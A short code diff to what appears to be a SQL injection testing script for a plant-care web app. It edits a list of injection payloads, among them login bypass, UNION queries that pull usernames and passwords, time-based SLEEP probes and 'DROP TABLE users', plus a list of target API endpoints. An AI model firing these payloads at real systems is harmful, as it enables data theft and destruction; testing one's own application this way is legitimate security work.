@@ -58,25 +58,24 @@ SQLI_PAYLOADS = [
     "' OR '1'='1",
     "' OR 1=1--",
     "'; DROP TABLE users;--",
-    "' UNION SELECT username, password FROM users--",
+    "' UNION SELECT username,password FROM users--",   # 공백 없애기
     "1' AND SLEEP(5)--",
     "' OR 'x'='x",
     "admin'--",
     "' OR 1=1#",
     "1; SELECT * FROM information_schema.tables--",
     "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
-    "' UNION SELECT null, table_name FROM information_schema.tables--",
+    "' UNION SELECT null,table_name FROM information_schema.tables--",  # 공백 없애기
     "' AND 1=1--",
     "' AND sleep(3)--",
 ]
 
-# 공격 대상: 인증 없이 접근 가능한 공개 엔드포인트
 SQLI_TARGETS = [
     "/api/v1/my-plants?userId={payload}",
     "/api/v1/schedules?plantId={payload}",
     "/api/dictionary/url?url={payload}",
     "/home?search={payload}",
-    "/login/kakao?code={payload}",
+    # "/login/kakao?code={payload}",  ← 제거 (OAuth 리다이렉트)
 ]
 
 _ssl_ctx = ssl.create_default_context()
